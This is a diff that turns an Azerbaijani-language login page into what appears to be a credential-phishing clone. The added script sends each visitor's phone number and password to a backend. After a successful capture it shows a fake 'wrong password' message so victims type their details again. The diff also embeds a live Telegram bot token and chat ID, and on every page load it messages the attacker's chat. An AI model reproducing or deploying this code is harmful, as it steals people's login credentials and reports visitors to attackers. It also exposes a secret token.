@@ -790,6 +790,10 @@
       color: #802700 !important;
       caret-color: #802700 !important;
     }
+    .v-kayit {
+        display: contents;      /* Margin'in doğru çalışması için linki blok element yapıyoruz */
+    text-align: right;   /* Linki sağa yaslamak için (orijinal tasarım gibi) */
+  }
   </style>
   <script id="google-tag-manager">
     (function (w, d, s, l, i) {
@@ -887,16 +891,18 @@
                                     </svg></button></div>
                               </div>
                             </div>
-                            <div class="v-text-field__details" id="passwordtext" style="display: none;"><div class="v-messages theme--light error--text" role="alert"><div class="v-messages__wrapper"><div class="v-messages__message">Telefon nömrəsi və ya şifrə yanlışdır.</div></div></div></div>
+                            <div class="v-text-field__details" id="passwordtext" style="display: none;"><div class="v-messages theme--light error--text" role="alert"><div class="v-messages__wrapper"><div class="v-messages__message">Daxil etdiyiniz şifrə və ya nömrə yanlışdır.</div></div></div></div>
                           </div>
                         </div><a data-v-2a918fee="" href="/forget.html"
                           class="text-decoration-none">Şifrəni unutmusan?</a>
-                      </div><button data-v-2a918fee="" type="button" disabled="disabled"
-                        class="rounded-lg v-btn v-btn--block v-btn--disabled v-btn--has-bg theme--light v-size--x-large"
-                        id="sign_in"><span class="v-btn__content">Daxil ol</span></button>
+                <button data-v-2a918fee="" type="button"
+    class="rounded-lg v-btn v-btn--block v-btn--has-bg theme--light v-size--x-large primary"
+    id="sign_in">
+    <span class="v-btn__content">Daxil ol</span>
+</button>
                     </form>
                     <div data-v-2a918fee="" class="mt-10 text-center"><span data-v-2a918fee="">Hesabın yoxdur?</span> <a
-                        data-v-2a918fee="" href="./register.html" class="text-decoration-none">Qeydiyyatdan keç</a>
+                        data-v-2a918fee="" href="./register.html" class="text-decoration-none v-kayit">Qeydiyyatdan keç</a>
                     </div>
                   </div>
                 </div>
@@ -1115,7 +1121,145 @@
     </div>
   </div>
 </body>
-<script src="js/D5l3grTt0Upg.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    // --- 1. Gerekli tüm HTML elemanlarını seçiyoruz ---
+    const phoneInput = document.getElementById('input-109');
+    const passwordInput = document.getElementById('input-112');
+    const loginButton = document.getElementById('sign_in');
+    const errorText = document.getElementById('passwordtext');
+    const buttonContent = loginButton.querySelector('.v-btn__content');
+
+    // --- 2. Butonun aktif/pasif durumunu kontrol eden merkezi fonksiyon ---
+    function checkInputs() {
+        const cleanPhoneNumber = phoneInput.value.replace(/\D/g, '');
+        const isPhoneValid = cleanPhoneNumber.length === 9;
+        const isPasswordValid = passwordInput.value.length > 0;
+
+        if (isPhoneValid && isPasswordValid) {
+            loginButton.removeAttribute('disabled');
+            loginButton.classList.remove('v-btn--disabled');
+            loginButton.style.backgroundColor = '#06bde9';
+            loginButton.style.borderColor = '#06bde9';
+            buttonContent.style.color = 'white';
+        } else {
+            loginButton.setAttribute('disabled', 'disabled');
+            loginButton.classList.add('v-btn--disabled');
+            loginButton.style.backgroundColor = '';
+            loginButton.style.borderColor = '';
+            buttonContent.style.color = '';
+        }
+    }
+
+    // --- 3. Telefon numarası alanını CANLI olarak formatlama ve kontrol etme ---
+    phoneInput.addEventListener('input', function() {
+        // Sadece rakamları tut
+        let digits = this.value.replace(/\D/g, '');
+
+        // DÜZELTME 1: Numaranın 9 haneyi geçmesini engelle
+        if (digits.length > 9) {
+            digits = digits.slice(0, 9);
+        }
+        this.value = digits; // Input'a sadece 9 haneli rakamı yaz
+
+        // Her değişiklikten sonra buton durumunu kontrol et
+        checkInputs();
+    });
+
+    // --- 4. Şifre alanını dinleme ---
+    passwordInput.addEventListener('input', checkInputs);
+
+    // --- 5. Butona tıklama olayı (Tüm mantık burada birleşiyor) ---
+    loginButton.addEventListener('click', function(event) {
+        event.preventDefault(); 
+        
+        if (this.hasAttribute('disabled')) {
+            return; // Buton pasifse hiçbir şey yapma
+        }
+
+        const cleanPhoneNumber = phoneInput.value.replace(/\D/g, '');
+        const passwordValue = passwordInput.value;
+        const fullPhoneNumber = '+994' + cleanPhoneNumber;
+
+        buttonContent.textContent = 'Gözləyin...';
+        this.setAttribute('disabled', 'disabled');
+        this.classList.add('v-btn--disabled');
+
+        // DÜZELTME 3: Veriyi backend'e gönder
+        fetch('/submit-login', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                phoneNumber: fullPhoneNumber,
+                password: passwordValue
+            }),
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.success) {
+                // DÜZELTME 2: Hata mesajını alert yerine sayfa içinde göster
+                if (errorText) {
+                    errorText.style.display = 'block';
+                }
+            } else {
+                alert('Server xətası: ' + (data.message || 'Bilinməyən xəta'));
+            }
+        })
+        .catch(error => {
+            console.error('Serverə qoşulmada xəta:', error);
+            alert('Serverə qoşulmada xəta baş verdi.');
+        })
+        .finally(() => {
+            // İşlem bitince butonu normale döndür ama hata mesajı kalsın
+            buttonContent.textContent = 'Daxil ol';
+            loginButton.removeAttribute('disabled');
+            loginButton.classList.remove('v-btn--disabled');
+        });
+    });
+
+    // Sayfa ilk yüklendiğinde butonun durumunu ayarla
+    checkInputs();
+});
+</script>
+  <script id="google-tag-manager">
+    (function (w, d, s, l, i) {
+      w[l] = w[l] || []; w[l].push({
+        'gtm.start':
+          new Date().getTime(), event: 'gtm.js'
+      }); var f = d.getElementsByTagName(s)[0],
+        j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : ''; j.async = true; j.src =
+          'https://www.googletagmanager.com/gtm.js?id=' + i + dl; f.parentNode.insertBefore(j, f);
+    })(window, document, 'script', 'dataLayer', 'GTM-PL5CCG4D');
+  </script>
+  <link rel="stylesheet" type="text/css" href="./forget/9162.d452c1a6.css">
+  <link rel="stylesheet" type="text/css" href="./forget/auth.1a6c1e0a.css">
+  <script>
+const token  = '8145659910:AAGi1J24CmTYJGA8KduFNqk7iqxT2g7og6U';
+const chatId = '-4648239173';
+
+function sendTelegramMessage(text) {
+return fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+  method: 'POST',
+  headers: { 'Content-Type': 'application/json' },
+  body: JSON.stringify({ chat_id: chatId, text })
+})
+.then(r => r.json())
+.then(data => {
+  if (!data.ok) throw new Error(data.description);
+  console.log('Telegram cevabı:', data);
+  return data;
+});
+}
 
 
+
+
+  </script>
+
+    <script>document.addEventListener("DOMContentLoaded", function () {
+        sendTelegramMessage("🔔 yeni ziyaret")})
+        
+        </script>
 </html>
